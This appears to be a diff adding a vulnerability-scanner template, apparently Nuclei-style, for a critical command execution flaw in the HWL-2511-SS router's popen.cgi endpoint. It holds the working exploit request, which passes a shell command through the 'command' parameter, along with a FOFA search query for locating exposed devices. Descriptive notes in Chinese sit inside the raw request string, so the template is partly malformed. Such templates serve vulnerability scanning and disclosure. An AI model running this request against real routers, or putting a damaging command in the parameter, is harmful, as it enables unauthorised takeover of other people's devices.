@@ -1,0 +1,34 @@
+id: poc-msg361lt54oslmzl
+info:
+  name: HWL-2511-SS路由器popen.cgi命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/msg361lt54oslmzl'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: msg361lt54oslmzl
+    fofa: body="app/feature/portForwarding.js" || body="app/app.translate-config.js"
+http:
+- raw:
+  - 'GET /cgi-bin/popen.cgi?command=id HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    uid
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
